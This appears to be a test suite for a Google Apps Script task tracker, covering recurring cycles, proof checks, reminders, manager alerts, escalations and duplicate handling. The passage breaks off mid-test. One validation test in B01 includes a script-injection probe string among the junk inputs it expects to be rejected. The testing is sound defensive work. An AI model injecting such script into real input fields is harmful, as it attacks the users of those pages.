/**
 * 12_Tests — the automated test suite. Runs (a) inside Google Sheets from the menu, on a temporary
 * sandbox spreadsheet, and (b) locally via `npm test` against the GAS mock. Same code, same results.
 * T* = assignment tests 1–8, B* = "try to break it" tests. Spec: specs/03-test-plan.md
 */

/* ───────────── fixture & sandbox ───────────── */

function testFixture_() {
  const portal = 'Update the portal ticket.';
  return {
    config: {
      MANAGER_EMAIL: 'manager@allo.test',
      LEADERSHIP_EMAILS: 'ceo@allo.test, coo@allo.test',
      EMAIL_MODE: 'LOG_ONLY',
      WORKING_DAYS: 'Mon,Tue,Wed,Thu,Fri,Sat',
      DEFAULT_DUE_TIME: '18:00',
      REMINDER_LEAD_MINUTES: '120',
      MANAGER_ALERT_GRACE_MINUTES: '30',
      ACK_DEADLINE_TIME: '11:00',
      RESOLVE_GRACE_WORKING_DAYS: '1',
      DAILY_UPDATE_MIN_CHARS: '20',
      RECENT_DAYS: '7',
      SIMULATED_NOW: '',
      WEBAPP_URL: '',
    },
    team: [
      ['Employee A', 'a@allo.test', '', true, ''],
      ['Employee B', 'b@allo.test', '', true, ''],
      ['Employee C', 'c@allo.test', '', true, ''],
      ['Employee D', 'd@allo.test', '', true, ''],
    ],
    tasks: [
      ['T01', 'Daily Operations Update', 'Employee A', 'Daily', 'Daily Update', 'Post the ops update in the WhatsApp group, paste it here.', '18:00', '2026-11-16', true, ''],
      ['T02', 'Portal Task A', 'Employee B', 'Every 7 days', 'Ticket ID', portal, '18:00', '2026-11-16', true, ''],
      ['T03', 'Portal Task B', 'Employee C', 'Every 15 days', 'Ticket ID', portal, '18:00', '2026-11-18', true, ''],
      ['T04', 'Portal Task C', 'Employee D', 'Every 30 days', 'Ticket ID', portal, '18:00', '2026-11-21', true, ''],
      ['T05', 'Weekly Vendor Recon', 'Employee A', 'Every 7 days', 'Ticket ID', 'Reconcile vendor statements.', '18:00', '2026-11-22', true, ''],
    ],
  };
}

function makeSandbox_(ss) {
  setupSystem_(ss, { seed: false });
  const sb = { ss: ss, t: null, mails: [], failMail: false };
  sb.mailer = {
    mode: 'CAPTURE',
    send: function (msg) {
      if (sb.failMail) throw new Error('Simulated mail outage');
      sb.mails.push(Object.assign({ sentAt: new Date(sb.t.getTime()) }, msg));
      return { delivery: 'CAPTURED' };
    },
  };
  sb.ctx = function () {
    return makeContext_(ss, {
      now: function () { return new Date(sb.t.getTime()); },
      mailer: sb.mailer,
      webAppUrl: 'https://script.google.com/macros/s/TEST/exec',
    });
  };
  sb.at = function (s) {
    const d = parseDateTime_(s);
    if (!d) throw new Error('Bad test time ' + s);
    sb.t = d;
    return sb;
  };
  sb.run = function (render) { return runEngineCore_(sb.ctx(), { render: !!render }); };
  sb.model = function () { return loadModel_(sb.ctx()); };
  sb.cycle = function (id) { return sb.model().byId[id] || null; };
  sb.cyclesOf = function (taskId) { return liveCycles_(sb.model()).filter(function (c) { return c.taskId === taskId; }); };
  sb.mailsOf = function (type) { return sb.mails.filter(function (x) { return x.type === type; }); };
  sb.complete = function (id, proof, actor) {
    const ctx = sb.ctx();
    const m = loadModel_(ctx);
    const res = completeCycle_(m, m.byId[id], proof, actor || 'tester');
    saveModel_(ctx, m);
    return res;
  };
  sb.ack = function (id, note) {
    return confirmAckCore_(sb.ctx(), id, signId_(id), note || '');
  };
  /** Simulates a user typing/pasting into a cell (values: scalar or 2-D array), then fires the edit handler. */
  sb.edit = function (sheetName, row, col, values, user) {
    const sh = ss.getSheetByName(sheetName);
    if (!sh) throw new Error('No sheet ' + sheetName);
    const grid = Array.isArray(values) ? values : [[values]];
    const range = sh.getRange(row, col, grid.length, grid[0].length);
    range.setValues(grid);
    return handleEditCore_(sb.ctx(), {
      range: range,
      source: ss,
      value: grid.length === 1 && grid[0].length === 1 ? grid[0][0] : undefined,
      user: user ? { getEmail: function () { return user; } } : undefined,
    });
  };
  sb.rowOf = function (sheetName, id) {
    const sh = ss.getSheetByName(sheetName);
    if (!sh) return -1;
    const last = sh.getLastRow();
    if (!last) return -1;
    const vals = sh.getRange(1, 1, last, 1).getValues();
    for (let i = 0; i < vals.length; i++) if (String(vals[i][0]) === id) return i + 1;
    return -1;
  };
  sb.cell = function (sheetName, row, col) { return ss.getSheetByName(sheetName).getRange(row, col).getValue(); };
  sb.formula = function (sheetName, row, col) { return ss.getSheetByName(sheetName).getRange(row, col).getFormula(); };
  sb.rows = function (sheetName) {
    const sh = ss.getSheetByName(sheetName);
    const last = sh.getLastRow();
    return last < 2 ? [] : sh.getRange(2, 1, last - 1, sh.getLastColumn()).getValues();
  };
  sb.logCount = function (event, id) {
    return sb.rows(SHEETS.LOG).filter(function (r) { return r[1] === event && (!id || r[2] === id); }).length;
  };
  sb.setTaskField = function (taskId, header, value) {
    const sh = ss.getSheetByName(SHEETS.TASKS);
    const idx = headerIndex_(sh);
    const r = sb.rowOf(SHEETS.TASKS, taskId);
    if (r < 0) throw new Error('No task ' + taskId);
    sh.getRange(r, idx[header]).setValue(value);
  };
  sb.setTeamField = function (name, header, value) {
    const sh = ss.getSheetByName(SHEETS.TEAM);
    const r = sb.rowOf(SHEETS.TEAM, name);
    sh.getRange(r, headerIndex_(sh)[header]).setValue(value);
  };
  sb.reset = function (mutate) {
    const fx = testFixture_();
    if (mutate) mutate(fx);
    const spec = configSpecByKey_();
    const csh = ss.getSheetByName(SHEETS.CONFIG);
    const keys = csh.getRange(2, 1, csh.getLastRow() - 1, 1).getValues().map(function (r) { return String(r[0]).trim(); });
    csh.getRange(2, 2, keys.length, 1).setValues(keys.map(function (k) {
      return [fx.config[k] !== undefined ? fx.config[k] : (spec[k] ? spec[k][1] : '')];
    }));
    [SHEETS.TEAM, SHEETS.TASKS, SHEETS.CYCLES, SHEETS.LOG, SHEETS.EMAILS].forEach(function (n) { clearDataRows_(ss.getSheetByName(n)); });
    ss.getSheets().forEach(function (sh) { if (sh.getName().indexOf(EMPLOYEE_TAB_PREFIX) === 0) ss.deleteSheet(sh); });
    writeTableRows_(ss.getSheetByName(SHEETS.TEAM), TEAM_FIELDS, fx.team);
    writeTableRows_(ss.getSheetByName(SHEETS.TASKS), TASK_FIELDS, fx.tasks);
    sb.mails = [];
    sb.failMail = false;
    sb.t = parseDateTime_('2026-11-16 10:00');
    return sb;
  };
  return sb;
}

function testKit_() {
  const notes = [];
  const show = function (v) { return isDate_(v) ? fmtShort_(v) : JSON.stringify(v); };
  return {
    notes: notes,
    note: function (s) { notes.push('• ' + s); },
    ok: function (cond, msg) {
      if (!cond) throw new Error('Expected: ' + msg);
      notes.push('✔ ' + msg);
    },
    eq: function (a, b, msg) {
      const same = isDate_(a) && isDate_(b) ? a.getTime() === b.getTime() : a === b;
      if (!same) throw new Error(msg + ' — expected ' + show(b) + ', got ' + show(a));
      notes.push('✔ ' + msg + ': ' + show(a));
    },
    has: function (s, sub, msg) {
      if (String(s).indexOf(sub) < 0) throw new Error(msg + ' — "' + truncate_(s, 160) + '" does not contain "' + sub + '"');
      notes.push('✔ ' + msg);
    },
  };
}

function dt_(s) { return parseDateTime_(s); }

/* ───────────── assignment tests T1–T8 ───────────── */

function test_T1_(sb, t) {
  sb.reset().at('2026-11-16 10:00').run();
  let c = sb.cycle('T02-20261116');
  t.eq(c.status, STATUS.OPEN, 'Portal Task A (7-day) cycle is open on its first due date');
  t.eq(c.dueAt, dt_('2026-11-16 18:00'), 'Due at the configured cut-off');

  sb.at('2026-11-16 11:00');
  const r = sb.complete('T02-20261116', 'PRT-1001', 'Employee B <b@allo.test>');
  t.ok(r.ok, 'Ticket PRT-1001 accepted');
  c = sb.cycle('T02-20261116');
  t.eq(c.status, STATUS.DONE, 'Current cycle closed');
  t.eq(c.completedAt, dt_('2026-11-16 11:00'), 'Completed at captured');
  t.eq(c.completedBy, 'Employee B <b@allo.test>', 'Completed by captured');
  t.eq(c.proof, 'PRT-1001', 'Ticket ID captured');
  const n = sb.cycle('T02-20261123');
  t.ok(n && n.status === STATUS.OPEN, 'Next cycle T02-20261123 created automatically');
  t.eq(n.dueAt, dt_('2026-11-23 18:00'), 'Next due = previous due + 7 days');
  t.eq(n.opensAt, dt_('2026-11-16 18:00'), 'Next cycle opens when the current period ends');

  t.ok(sb.complete('T03-20261118', 'PRT-2001').ok, '15-day task completed');
  t.eq(sb.cycle('T03-20261203').dueAt, dt_('2026-12-03 18:00'), '15-day task: next due +15 days');
  t.ok(sb.complete('T04-20261121', 'PRT-3001').ok, '30-day task completed');
  t.eq(sb.cycle('T04-20261221').dueAt, dt_('2026-12-21 18:00'), '30-day task: next due +30 days');

  sb.run(); sb.run(); sb.run();
  ['T02', 'T03', 'T04'].forEach(function (id) {
    const open = sb.cyclesOf(id).filter(function (x) { return x.status === STATUS.OPEN; });
    t.eq(open.length, 1, id + ' has exactly one open cycle after 3 more engine runs');
  });
  t.eq(sb.cyclesOf('T02').length, 2, 'T02 ledger: closed cycle + next cycle, nothing else');
}

function test_T2_(sb, t) {
  sb.reset().at('2026-11-16 10:00').run(true);
  const tab = employeeTabName_('Employee B');
  const row = sb.rowOf(tab, 'T02-20261116');
  t.ok(row >= EMP_VIEW.FIRST_ROW, 'Pending task is listed on Employee B\'s own tab (row ' + row + ')');
  t.has(sb.cell(tab, row, 3), 'Due today', 'Status column says it is due today');
  t.has(sb.cell(tab, row, 4), 'Ticket ID', 'Required proof is shown on the same row, next to the input cell');

  sb.at('2026-11-16 12:00');
  const res = sb.edit(tab, row, EMP_VIEW.INPUT_COL, 'PRT-2002', 'b@allo.test');
  t.ok(res.handled && res.outcomes.length === 1 && res.outcomes[0].ok, 'Typing the Ticket ID in the yellow cell completes the task');
  const c = sb.cycle('T02-20261116');
  t.eq(c.status, STATUS.DONE, 'Ledger (Cycles) updated from that single edit');
  t.eq(c.proof, 'PRT-2002', 'Ticket stored in the ledger');
  t.eq(c.completedBy, 'Employee B <b@allo.test>', 'Editor identity recorded');
  t.eq(sb.logCount('COMPLETED', 'T02-20261116'), 1, 'Audit log entry written');

  const doneRow = sb.rowOf(tab, 'T02-20261116');
  t.ok(doneRow > row, 'Row moved to the COMPLETED section of the same tab');
  t.has(sb.cell(tab, doneRow, 3), 'Done on time', 'Completed section shows the result');
  t.ok(sb.rowOf(tab, 'T02-20261123') > 0, 'Next cycle visible under COMING UP');
  const dRow = sb.rowOf(SHEETS.DASHBOARD, 'T02-20261116');
  t.ok(dRow > 0, 'Manager Dashboard refreshed with the completion (no manager re-entry)');
  t.eq(sb.cell(SHEETS.DASHBOARD, dRow, DASH.RECENT_PROOF_COL), 'PRT-2002', 'Dashboard shows the proof');

  // Replays: the same entry again on the now-completed row, and the same completion via another path.
  const replay = sb.edit(tab, doneRow, EMP_VIEW.INPUT_COL, 'PRT-2002', 'b@allo.test');
  t.ok(replay.outcomes[0].code === 'NOT_OPEN', 'Replaying the edit is rejected as already done');
  t.eq(sb.complete('T02-20261116', 'PRT-2002').code, 'NOT_OPEN', 'Second completion through any path is rejected');
  t.eq(sb.logCount('COMPLETED', 'T02-20261116'), 1, 'Still exactly one completion entry');
  t.eq(sb.cyclesOf('T02').length, 2, 'No extra cycle created by replays');
}

function test_T3_(sb, t) {
  sb.reset().at('2026-11-16 10:00').run(true);
  const tab = employeeTabName_('Employee A');
  const row = sb.rowOf(tab, 'T01-20261116');
  t.ok(row >= EMP_VIEW.FIRST_ROW, 'Daily task for Mon 16 Nov is on Employee A\'s tab');
  t.has(sb.cell(tab, row, 4), 'WhatsApp', 'Row tells the employee to paste the WhatsApp update');

  let r = sb.edit(tab, row, EMP_VIEW.INPUT_COL, 'done', 'a@allo.test');
  t.eq(r.outcomes[0].code, 'TOO_SHORT', '"done" is rejected (not evidence)');
  t.has(sb.cell(tab, row, EMP_VIEW.RESULT_COL), '❌', 'Reason is shown next to the entry');
  t.eq(sb.cycle('T01-20261116').status, STATUS.OPEN, 'Task remains open');

  const update = 'Ops update 16 Nov: 42 orders dispatched, 3 delayed (courier), stock OK.';
  sb.at('2026-11-16 17:30');
  r = sb.edit(tab, row, EMP_VIEW.INPUT_COL, update, 'a@allo.test');
  t.ok(r.outcomes[0].ok, 'Pasting the actual update completes the daily task');
  const c = sb.cycle('T01-20261116');
  t.eq(c.status, STATUS.DONE, 'Completed before the 18:00 cut-off = on time');
  t.eq(c.proof, update, 'Full update text stored as evidence');
  t.eq(c.completedAt, dt_('2026-11-16 17:30'), 'Timestamp captured automatically');
  const doneRow = sb.rowOf(tab, 'T01-20261116');
  t.has(sb.formula(tab, doneRow, 5), 'https://wa.me/?text=' + encodeURIComponent('Ops update'), 'One-tap "Share on WhatsApp" link generated from the same text');

  sb.at('2026-11-17 00:15').run();
  const tue = sb.cycle('T01-20261117');
  t.ok(tue && tue.status === STATUS.OPEN, 'Next working day\'s cycle created automatically');
  t.eq(tue.dueAt, dt_('2026-11-17 18:00'), 'Tuesday cut-off 18:00');
  sb.at('2026-11-17 09:00');
  t.eq(sb.complete('T01-20261117', update).code, 'DUP_UPDATE', 'Yesterday\'s text pasted again is rejected');
  t.eq(sb.complete('T01-20261117', '  OPS UPDATE 16 nov: 42 orders dispatched, 3 delayed (courier), stock ok. ').code, 'DUP_UPDATE',
    'A re-cased / re-spaced copy is also rejected');

  sb.at('2026-11-22 09:00').run();
  t.ok(!sb.cycle('T01-20261122'), 'No daily cycle on Sunday (non-working day)');
  sb.at('2026-11-23 09:00').run();
  t.ok(!!sb.cycle('T01-20261123'), 'Daily cycle resumes on Monday');
}

function test_T4_(sb, t) {
  sb.reset().at('2026-11-16 10:00').run();
  sb.at('2026-11-16 15:59').run();
  t.eq(sb.mailsOf('REMINDER').length, 0, '15:59 — no reminder yet');
  sb.at('2026-11-16 16:00').run();
  const rem = sb.mailsOf('REMINDER');
  t.eq(rem.length, 2, '16:00 — one reminder each to Employee A and Employee B (cut-off − 2h)');
  const remA = rem.filter(function (x) { return x.to === 'a@allo.test'; })[0];
  t.ok(remA && remA.cycleIds.indexOf('T01-20261116') >= 0, 'Employee A is reminded about the daily update');

  sb.at('2026-11-16 18:29').run();
  t.eq(sb.mailsOf('MANAGER_ALERT').length, 0, '18:29 — still inside the 30-minute grace, no alert');
  sb.at('2026-11-16 18:31').run();
  const alerts = sb.mailsOf('MANAGER_ALERT');
  t.eq(alerts.length, 1, '18:31 — exactly one (batched) alert email');
  const a = alerts[0];
  t.eq(a.to, 'manager@allo.test', 'Sent to the manager');
  t.ok(a.cycleIds.indexOf('T01-20261116') >= 0 && a.cycleIds.indexOf('T02-20261116') >= 0, 'Lists both pending tasks');
  t.has(a.subject, 'Employee A', 'Subject names the employee');
  t.has(a.htmlBody, 'Daily Operations Update', 'Body names the task');
  t.has(a.htmlBody, 'Acknowledge by', 'Body tells the manager what to do and by when');
  t.ok(sameDay_(a.sentAt, dt_('2026-11-16 18:00')), 'Alert sent on the same day as the cut-off');
  t.eq(sb.cycle('T01-20261116').alertAt, dt_('2026-11-16 18:31'), 'Alert time stamped on the cycle');
  sb.at('2026-11-16 18:46').run();
  sb.run();
  t.eq(sb.mailsOf('MANAGER_ALERT').length, 1, 'Later runs do not re-send the alert');
  t.eq(sb.mailsOf('REMINDER').length, 2, 'Later runs do not re-send reminders');
}

function test_T5_(sb, t) {
  sb.reset().at('2026-11-16 10:00').run();
  sb.at('2026-11-16 18:31').run(true);
  const D = SHEETS.DASHBOARD;
  let row = sb.rowOf(D, 'T01-20261116');
  t.ok(row > 0, 'Alerted task appears under NEEDS ATTENTION');

  sb.at('2026-11-16 19:05');
  sb.edit(D, row, DASH.NOTE_COL, 'Called A — posting by 9am tomorrow', 'manager@allo.test');
  row = sb.rowOf(D, 'T01-20261116');
  const r = sb.edit(D, row, DASH.ACK_COL, true, 'manager@allo.test');
  t.ok(r.handled && r.outcomes[0].ok, 'Manager ticks ✅ Ack on the dashboard');
  let c = sb.cycle('T01-20261116');
  t.eq(c.ackAt, dt_('2026-11-16 19:05'), 'Acknowledged-at recorded');
  t.eq(c.ackBy, 'manager@allo.test', 'Acknowledged-by recorded');
  t.eq(c.ackNote, 'Called A — posting by 9am tomorrow', 'Manager note recorded');
  t.eq(sb.logCount('ACKNOWLEDGED', 'T01-20261116'), 1, 'Audit entry written');

  const id2 = 'T02-20261116';
  const sig = signId_(id2);
  const page = doGetCore_(sb.ctx(), { a: 'ack', c: id2, s: sig });
  t.has(page.html, 'Confirm acknowledgement', 'Email link opens a confirmation page');
  t.ok(!sb.cycle(id2).ackAt, 'Opening the link alone does NOT acknowledge (safe against link scanners)');
  t.ok(!confirmAckCore_(sb.ctx(), id2, sig.slice(0, -2) + 'xx', 'x').ok, 'Forged signature rejected');
  t.ok(!confirmAckCore_(sb.ctx(), 'T01-20261116', sig, 'x').ok, 'Signature for another task rejected');
  sb.at('2026-11-16 19:20');
  t.ok(sb.ack(id2, 'Portal was down; B retries in the morning').ok, 'Confirm button acknowledges');
  c = sb.cycle(id2);
  t.has(c.ackBy, '(email link)', 'Ack source recorded as email link');

  sb.at('2026-11-17 09:10');
  t.ok(sb.complete('T01-20261116', 'Ops update 16 Nov (late): 40 orders out, 2 delayed.', 'Employee A').ok, 'Employee completes after the alert');
  sb.run(true);
  row = sb.rowOf(D, 'T01-20261116');
  t.has(sb.cell(D, row, 5), 'after alert', 'Dashboard shows the task was completed after the alert');
  t.eq(sb.cell(D, row, DASH.ACK_COL), '✅', 'Dashboard still shows the acknowledgement (as a record, no checkbox on closed rows)');
  sb.at('2026-11-17 11:01').run();
  t.ok(!sb.cycle('T01-20261116').escalatedAt, 'Acknowledged + completed → no leadership escalation');
  t.eq(sb.mailsOf('LEADERSHIP_ESCALATION').length, 0, 'No leadership email at the ack deadline');
}

function test_T6_(sb, t) {
  // (a) Manager does not acknowledge.
  sb.reset().at('2026-11-16 10:00').run();
  sb.at('2026-11-16 18:31').run();
  sb.at('2026-11-17 10:59').run();
  t.eq(sb.mailsOf('LEADERSHIP_ESCALATION').length, 0, 'Tue 10:59 — before the ack deadline, nothing to leadership');
  sb.at('2026-11-17 11:01').run();
  let esc = sb.mailsOf('LEADERSHIP_ESCALATION');
  t.eq(esc.length, 1, 'Tue 11:01 — one escalation email');
  t.eq(esc[0].to, 'ceo@allo.test, coo@allo.test', 'Sent to leadership');
  t.eq(esc[0].cc, 'manager@allo.test', 'Manager copied');
  t.has(sb.cycle('T01-20261116').escalationReason, 'did not acknowledge', 'Reason: manager did not acknowledge');
  sb.at('2026-11-17 11:16').run();
  t.eq(sb.mailsOf('LEADERSHIP_ESCALATION').length, 1, 'No repeat on the next run');

  // (b) Manager acknowledges but the task stays open.
  sb.reset().at('2026-11-16 10:00').run();
  sb.at('2026-11-16 18:31').run();
  sb.at('2026-11-16 19:00');
  sb.ack('T02-20261116', 'Chasing B');
  sb.at('2026-11-17 11:01').run();
  t.ok(!sb.cycle('T02-20261116').escalatedAt, 'Acknowledged task is not escalated at the ack deadline');
  t.ok(!!sb.cycle('T01-20261116').escalatedAt, '…while the unacknowledged one is');
  sb.at('2026-11-17 17:59').run();
  t.ok(!sb.cycle('T02-20261116').escalatedAt, 'Tue 17:59 — still within the resolve window');
  sb.at('2026-11-17 18:01').run();
  const c = sb.cycle('T02-20261116');
  t.eq(c.escalatedAt, dt_('2026-11-17 18:01'), 'Tue 18:01 — escalated: still not done one working day after the cut-off');
  t.has(c.escalationReason, 'still not completed', 'Reason: still not completed');
  esc = sb.mailsOf('LEADERSHIP_ESCALATION');
  t.ok(esc[esc.length - 1].cycleIds.indexOf('T02-20261116') >= 0, 'Escalation email lists the task');
  t.has(esc[esc.length - 1].htmlBody, 'Chasing B', 'Leadership sees the manager\'s acknowledgement note');

  sb.at('2026-11-17 18:20');
  sb.complete('T02-20261116', 'PRT-7777', 'Employee B');
  sb.at('2026-11-17 18:31').run();
  sb.at('2026-11-17 18:46').run();
  const resolved = sb.mailsOf('RESOLVED_NOTICE');
  t.eq(resolved.length, 1, 'Exactly one "resolved" notice closes the loop for leadership');
  t.ok(resolved[0].cycleIds.indexOf('T02-20261116') >= 0, 'Resolved notice names the task');
}

function test_T7_(sb, t) {
  sb.reset();
  let cfg = sb.ctx().cfg;
  const due = dt_('2026-11-16 18:00');
  t.eq(reminderAt_(due, cfg), dt_('2026-11-16 16:00'), 'Reminder to employee: cut-off − 2h');
  t.eq(managerAlertAt_(due, cfg), dt_('2026-11-16 18:30'), 'Manager alert: cut-off + 30 min, same day');
  t.eq(ackDeadline_(dt_('2026-11-16 18:30'), cfg), dt_('2026-11-17 11:00'), 'Ack deadline: 11:00 next working day');
  t.eq(resolveDeadline_(due, cfg), dt_('2026-11-17 18:00'), 'Resolve deadline: cut-off time next working day');
  const sat = dt_('2026-11-21 18:00');
  t.eq(ackDeadline_(dt_('2026-11-21 18:30'), cfg), dt_('2026-11-23 11:00'), 'Saturday alert → ack deadline skips Sunday');
  t.eq(resolveDeadline_(sat, cfg), dt_('2026-11-23 18:00'), 'Saturday cut-off → resolve deadline Monday');

  sb.reset(function (fx) { fx.config.WORKING_DAYS = 'Mon,Tue,Wed,Thu,Fri'; });
  cfg = sb.ctx().cfg;
  t.eq(ackDeadline_(dt_('2026-11-20 18:30'), cfg), dt_('2026-11-23 11:00'), 'Mon–Fri calendar: Friday alert → Monday 11:00');
  t.eq(resolveDeadline_(dt_('2026-11-20 18:00'), cfg), dt_('2026-11-23 18:00'), 'Mon–Fri calendar: Friday cut-off → Monday 18:00');

  sb.reset().at('2026-11-21 10:00').run();
  sb.at('2026-11-21 18:31').run();
  const alert = sb.mailsOf('MANAGER_ALERT')[0];
  t.ok(alert && alert.cycleIds.indexOf('T04-20261121') >= 0, 'Saturday: 30-day task alerted the same evening');
  sb.at('2026-11-22 12:00').run();
  t.eq(sb.mailsOf('LEADERSHIP_ESCALATION').length, 0, 'Sunday: no escalation (non-working day)');
  sb.at('2026-11-23 11:01').run();
  const esc = sb.mailsOf('LEADERSHIP_ESCALATION');
  t.ok(esc.length === 1 && esc[0].cycleIds.indexOf('T04-20261121') >= 0, 'Monday 11:01: escalated to leadership');
}

function test_T8_(sb, t) {
  sb.reset().at('2026-11-16 10:00').run();
  const before = sb.model().cycles.length;
  for (let i = 0; i < 10; i++) sb.run();
  t.eq(sb.model().cycles.length, before, '10 engine runs at the same moment create no extra cycles (' + before + ')');

  sb.at('2026-11-16 18:31');
  for (let i = 0; i < 5; i++) sb.run();
  t.eq(sb.mailsOf('MANAGER_ALERT').length, 1, '5 runs after the cut-off → one manager alert');

  sb.at('2026-11-17 11:01');
  sb.failMail = true;
  sb.run();
  t.eq(sb.mailsOf('LEADERSHIP_ESCALATION').length, 0, 'Mail outage: nothing delivered');
  t.ok(!sb.cycle('T01-20261116').escalatedAt, 'Mail outage: cycle not marked as escalated');
  t.ok(sb.rows(SHEETS.EMAILS).some(function (r) { return r[1] === 'LEADERSHIP_ESCALATION' && r[6] === 'FAILED'; }), 'Failure recorded in Email Log');
  sb.failMail = false;
  sb.at('2026-11-17 11:16').run();
  t.eq(sb.mailsOf('LEADERSHIP_ESCALATION').length, 1, 'Next run after the outage delivers exactly once');
  sb.run(); sb.run(); sb.run();
  t.eq(sb.mailsOf('LEADERSHIP_ESCALATION').length, 1, '3 more runs: still exactly one escalation');

  sb.at('2026-11-17 12:00');
  t.ok(sb.complete('T02-20261116', 'PRT-8888').ok, 'First completion accepted');
  t.eq(sb.complete('T02-20261116', 'PRT-8888').code, 'NOT_OPEN', 'Duplicate completion rejected');
  t.eq(sb.logCount('COMPLETED', 'T02-20261116'), 1, 'One completion entry');
  for (let i = 0; i < 3; i++) sb.run();
  t.eq(sb.cyclesOf('T02').length, 2, 'One next cycle, no duplicates');
  const delivered = sb.rows(SHEETS.EMAILS).filter(function (r) { return r[1] === 'MANAGER_ALERT' && r[6] === 'CAPTURED'; });
  t.eq(delivered.length, 1, 'Email Log: one delivered manager alert for the day');
}

/* ───────────── break-it tests B01–B22 ───────────── */

function test_B01_(sb, t) {
  sb.reset().at('2026-11-16 10:00').run();
  ['', 'done', 'ok', '12', 'ABC', '<script>alert(1)</script>', 'PRT 123', 'X1' + new Array(60).join('Z'), '#4471'].forEach(function (v) {
    const r = sb.complete('T02-20261116', v);
    t.ok(!r.ok, 'Rejects ' + JSON.stringify(truncate_(v, 24)) + ' (' + r.code + ')');
  });
  t.eq(sb.cycle('T02-20261116').status, STATUS.OPEN, 'Cycle still open after junk input');
  t.ok(sb.complete('T02-20261116', 'inc0012345').ok, 'Accepts a realistic ticket (inc0012345)');
}

function test_B02_(sb, t) {
  sb.reset().at('2026-11-16 10:00').run();
  t.ok(sb.complete('T02-20261116', 'PRT-5000').ok, 'Week 1 ticket accepted');
  sb.at('2026-11-17 09:00');
  t.eq(sb.complete('T02-20261123', 'prt-5000').code, 'DUP_TICKET', 'Re-using last week\'s ticket (any case) is rejected');
  t.eq(sb.complete('T03-20261118', 'PRT-5000').code, 'DUP_TICKET', 'Re-using it on another task is rejected');
  t.ok(sb.complete('T02-20261123', 'PRT-5001').ok, 'A fresh ticket is accepted');
}

function test_B03_(sb, t) {
  sb.reset().at('2026-11-16 10:00').run();
  t.eq(sb.complete('T05-20261122', 'VR-9001').code, 'NOT_YET', 'Cannot close a cycle whose window has not opened');
  sb.complete('T02-20261116', 'PRT-6000');
  sb.at('2026-11-16 12:00');
  t.eq(sb.complete('T02-20261123', 'PRT-6001').code, 'NOT_YET', 'Cannot close next week early on the same day');
  sb.at('2026-11-16 18:01');
  t.ok(sb.complete('T02-20261123', 'PRT-6001').ok, 'Allowed once the current period has ended');
}

function test_B04_(sb, t) {
  sb.reset().at('2026-11-16 10:00').run();
  sb.at('2026-11-25 10:00');
  const r = sb.complete('T02-20261116', 'PRT-4444');
  t.ok(r.ok, 'Late completion accepted');
  t.eq(sb.cycle('T02-20261116').status, STATUS.LATE, 'Marked LATE_DONE');
  const skipped = sb.cycle('T02-20261123');
  t.eq(skipped.status, STATUS.SKIPPED, 'The slot that passed meanwhile is recorded as SKIPPED');
  t.has(skipped.closeNote, 'T02-20261116', 'Skip note explains why');
  const next = sb.cycle('T02-20261130');
  t.ok(next && next.status === STATUS.OPEN, 'Next open cycle is the next future slot');
  t.eq(next.dueAt, dt_('2026-11-30 18:00'), 'Anchored schedule kept (Mondays)');
  t.eq(sb.cyclesOf('T02').filter(function (c) { return c.status === STATUS.OPEN; }).length, 1, 'Still exactly one open cycle');
}

function test_B05_(sb, t) {
  sb.reset().at('2026-11-16 10:00').run();
  sb.setTaskField('T02', 'Active', false);
  sb.at('2026-11-16 18:31').run();
  t.eq(sb.cycle('T02-20261116').status, STATUS.WAIVED, 'Deactivated task: open cycle waived');
  const alert = sb.mailsOf('MANAGER_ALERT')[0];
  t.ok(alert && alert.cycleIds.indexOf('T02-20261116') < 0, 'No alert for the deactivated task');
  t.has(sb.cell(SHEETS.TASKS, sb.rowOf(SHEETS.TASKS, 'T02'), TASK_FIELDS.length), 'Inactive', 'Health column says Inactive');
  sb.setTaskField('T02', 'Active', true);
  sb.at('2026-11-26 10:00').run();
  t.ok(!sb.cycle('T02-20261123'), 'Reactivation does not backfill the paused period');
  t.eq(sb.cycle('T02-20261130').status, STATUS.OPEN, 'Fresh cycle at the next future slot');
}

function test_B06_(sb, t) {
  sb.reset().at('2026-11-16 10:00').run(true);
  sb.setTaskField('T02', 'Assigned To', 'Employee C');
  sb.run(true);
  t.eq(sb.cycle('T02-20261116').employee, 'Employee C', 'Open cycle moves to the new owner');
  t.ok(sb.rowOf(employeeTabName_('Employee C'), 'T02-20261116') > 0, 'Shows on Employee C\'s tab');
  t.eq(sb.rowOf(employeeTabName_('Employee B'), 'T02-20261116'), -1, 'Removed from Employee B\'s tab');
  t.eq(sb.logCount('REASSIGNED', 'T02-20261116'), 1, 'Reassignment logged');
}

function test_B07_(sb, t) {
  sb.reset().at('2026-11-16 10:00').run();
  sb.at('2026-11-16 19:00').run(true);
  const tab = employeeTabName_('Employee A');
  const r1 = sb.rowOf(tab, 'T01-20261116');
  const r2 = sb.rowOf(tab, 'T05-20261122');
  t.ok(r1 > 0 && r2 === r1 + 1, 'Two actionable rows on Employee A\'s tab');
  const res = sb.edit(tab, r1, EMP_VIEW.INPUT_COL, [['Ops update 16 Nov: all 51 orders out, no delays today.'], ['VR-2026-1116']], 'a@allo.test');
  t.eq(res.outcomes.filter(function (o) { return o.ok; }).length, 2, 'Multi-row paste completes both rows');
  t.eq(sb.cycle('T01-20261116').status, STATUS.LATE, 'Daily (after 18:00) recorded late');
  t.eq(sb.cycle('T05-20261122').status, STATUS.DONE, 'Weekly recon recorded on time');
  t.eq(sb.edit(tab, 8, 2, 'renamed task', 'a@allo.test').handled, false, 'Edits outside the input column are ignored');
  t.eq(sb.edit(tab, 3, EMP_VIEW.INPUT_COL, 'hello', 'a@allo.test').handled, false, 'Edits in the title rows are ignored');
  t.eq(sb.edit(tab, 1, 1, 'x').handled, false, 'Editing the title cell does nothing');
}

function test_B08_(sb, t) {
  sb.reset().at('2026-11-16 10:00').run(true);
  const tab = employeeTabName_('Employee B');
  const row = sb.rowOf(tab, 'T02-20261116');
  sb.complete('T02-20261116', 'PRT-1111');
  const stale = sb.edit(tab, row, EMP_VIEW.INPUT_COL, 'PRT-2222', 'b@allo.test');
  t.eq(stale.outcomes[0].code, 'NOT_OPEN', 'Entry on a stale row is refused (already done)');
  t.eq(sb.cycle('T02-20261116').proof, 'PRT-1111', 'Original proof untouched');
  const sh = sb.ss.getSheetByName(tab);
  sh.getRange(60, 1).setValue('ZZZ-404');
  t.eq(sb.edit(tab, 60, EMP_VIEW.INPUT_COL, 'PRT-3333').outcomes[0].code, 'UNKNOWN', 'Unknown Cycle ID handled gracefully');
  sh.getRange(61, 1).setValue('T01-20261116');
